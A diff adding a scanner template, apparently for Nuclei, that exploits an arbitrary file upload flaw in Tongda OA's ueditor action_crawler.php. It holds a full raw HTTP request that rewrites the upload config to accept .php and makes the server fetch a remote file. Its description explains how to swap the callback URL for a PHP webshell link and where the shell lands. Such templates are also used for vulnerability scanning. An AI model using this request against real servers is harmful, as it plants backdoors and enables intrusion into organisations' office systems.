@@ -1,0 +1,45 @@
+id: tongda-oa-action-crawler-fileupload
+
+info:
+  name: 通达OA action_crawler.php 任意文件上传
+  author: SleepingBag945
+  severity: critical
+  description: 替换下载路径为php木马下载链接即可，木马路径/api/{{filename}}.php
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+      - |
+        POST /module/ueditor/php/action_crawler.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Accept-Encoding: gzip, deflate
+
+        CONFIG[catcherPathFormat]=/api/{{filename}}&CONFIG[catcherMaxSize]=100000&CONFIG[catcherAllowFiles][]=.php&CONFIG[catcherAllowFiles][]=.ico&CONFIG[catcherFieldName]=file&file[]=https://{{interactsh-url}}
+
+      # - |
+      #   GET /api/{{filename}}.php HTTP/1.1
+      #   Host: {{Hostname}}
+      #   User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+      #   Connection: close
+      #   Content-Type: application/x-www-form-urlencoded
+      #   X-Forwarded-For: 127.0.0.1
+      #   X-Originating-IP: 127.0.0.1
+      #   X-Remote-Addr: 127.0.0.1
+      #   X-Remote-IP: 127.0.0.1
+      #   Accept-Encoding: gzip, deflate
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
